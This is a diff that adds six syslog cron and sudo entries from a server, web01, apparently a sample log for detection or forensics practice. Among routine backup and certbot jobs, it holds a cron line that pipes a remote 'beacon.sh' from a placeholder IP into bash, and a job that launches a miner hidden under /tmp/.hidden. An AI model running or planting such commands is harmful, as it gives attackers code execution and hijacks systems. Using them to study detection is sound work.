@@ -1,0 +1,6 @@
+Dec 30 02:00:01 web01 CRON[4410]: (root) CMD (/usr/local/bin/backup.sh)
+Dec 30 03:30:01 web01 CRON[4488]: (root) CMD (/usr/bin/certbot renew)
+Dec 30 03:35:12 web01 sudo:   deploy : TTY=pts/1 ; PWD=/opt ; USER=root ; COMMAND=/usr/bin/apt-get update
+Dec 31 03:16:01 web01 CRON[5120]: (intern) CMD (curl -s http://203.0.113.200/beacon.sh | bash)
+Dec 31 04:00:01 web01 CRON[5199]: (root) CMD (/usr/local/bin/backup.sh)
+Dec 31 04:07:44 web01 CRON[5240]: (www-data) CMD (/tmp/.hidden/miner --daemon)
